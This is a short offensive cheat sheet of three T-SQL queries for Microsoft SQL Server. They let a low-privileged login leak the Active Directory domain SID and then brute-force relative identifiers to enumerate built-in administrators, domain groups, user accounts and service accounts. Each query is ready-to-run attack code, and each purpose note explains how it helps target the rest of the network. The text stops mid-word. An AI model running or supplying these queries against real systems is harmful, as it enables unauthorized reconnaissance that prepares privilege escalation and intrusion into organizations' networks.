
### 1. Leaking the Base Domain SID

```
SELECT DEFAULT_DOMAIN() AS [Domain], TRY_CONVERT(varchar(100), SUSER_SID(DEFAULT_DOMAIN() + '\Domain Users'), 1) AS [Group_SID];
```

*Purpose:*
Used to retrieve the unique 48-byte Domain Base Security Identifier (SID) without administrative privileges. By looking up a standard group like 'Domain Users', the database queries Active Directory and leaks the hex identity prefix needed to target the rest of the network.

### 2. Standard Infrastructure RID Sweep (Little-Endian)

```
DECLARE @i INT=500,@s VARCHAR(99),@b BINARY(4); WHILE @i<600 BEGIN SET @b=CAST(@i AS BINARY(4)); SET @s=SUSER_SNAME(0x010500000000000515000000A185DEEFB22433798D8E847A+SUBSTRING(@b,4,1)+SUBSTRING(@b,3,1)+SUBSTRING(@b,2,1)+SUBSTRING(@b,1,1)); IF @s IS NOT NULL PRINT CAST(@i AS VARCHAR)+': '+@s; SET @i=@i+1; END;
```

*Purpose:*
Brute-forces the 500-600 Relative Identifier (RID) range. This maps universal, built-in Active Directory assets like the default Administrator (500), Domain Admins (512), and Domain Controllers (516). 


### 3. Active Directory Custom Object Enumeration

```
DECLARE @i INT=1100,@s VARCHAR(99),@b BINARY(4); WHILE @i<1300 BEGIN SET @b=CAST(@i AS BINARY(4)); SET @s=SUSER_SNAME(0x010500000000000515000000A185DEEFB22433798D8E847A+SUBSTRING(@b,4,1)+SUBSTRING(@b,3,1)+SUBSTRING(@b,2,1)+SUBSTRING(@b,1,1)); IF @s IS NOT NULL PRINT CAST(@i AS VARCHAR)+': '+@s; SET @i=@i+1; END;
```

*Purpose:*
Iterates through the custom user object range (RIDs 1100+). This allows a low-privileged user to map every human account, custom department group (IT, Finance), and service account (sql_svc) active on the Domain Contro

